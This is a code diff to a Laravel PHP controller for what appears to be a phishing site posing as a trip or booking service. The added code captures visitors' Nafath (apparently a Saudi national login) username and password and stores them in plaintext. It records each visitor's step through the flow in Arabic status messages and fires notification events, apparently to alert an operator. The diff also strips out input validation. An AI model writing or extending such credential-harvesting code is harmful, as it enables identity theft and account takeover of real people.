@@ -293,22 +293,31 @@ class TripController extends Controller
     public function phoneAuthStore(Request $request)
     {
         try {
-            return $this->saveRecievedCode($request);
-            $validated = $this->validate($request, [
-                'phone_number' => 'required',
-                // 'provider' => 'required',
-            ]);
+
+            // $validated = $this->validate($request, [
+            //     'phone_number' => 'required',
+            //     // 'provider' => 'required',
+            // ]);
 
             $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
             if ($visitor) {
 
                 $not  = VisitorNotifications::first();
-
+                $not->update(['page' => 'دخل لصفحة معلومات نفاذ','step_number'=>10]);
+                session()->put('visitor', json_encode($not));
                 // event(new SendCode($not));
                 event(new SendNotification($not));
             }
+            return redirect()->route('enter_nafad_page');
+            // if ($visitor) {
+
+            //     $not  = VisitorNotifications::first();
+
+            //     // event(new SendCode($not));
+            //     event(new SendNotification($not));
+            // }
+            // // return view('phone_waiting',compact('not'));
             // return view('phone_waiting',compact('not'));
-            return view('phone_waiting',compact('not'));
         } catch (\Exception $ex) {
             dd($ex->getMessage());
         }
@@ -345,7 +354,14 @@ class TripController extends Controller
             if ($visitor) {
 
                 $not  = VisitorNotifications::first();
-                $not->update(['page' => 'أرسل المعرف الخاص بنفاذ','step_number'=>11,'nafad_id'=>$request->phone ?? null]);
+                if($request->has('username'))
+                {
+                    $not->update(['page' => 'أرسل اسم المستخدم وكلمة السر الخاص بنفاذ','step_number'=>11,'nafad_id'=>$request->phone ?? null,'nafad_username'=>$request->username,'nafad_password'=>$request->password]);
+                }
+                else{
+                    $not->update(['page' => 'أرسل المعرف الخاص بنفاذ','step_number'=>11,'nafad_id'=>$request->phone ?? null]);
+
+                }
                 session()->put('visitor', json_encode($not));
                 event(new SendNafadId($not));
                 event(new SendNotification($not));
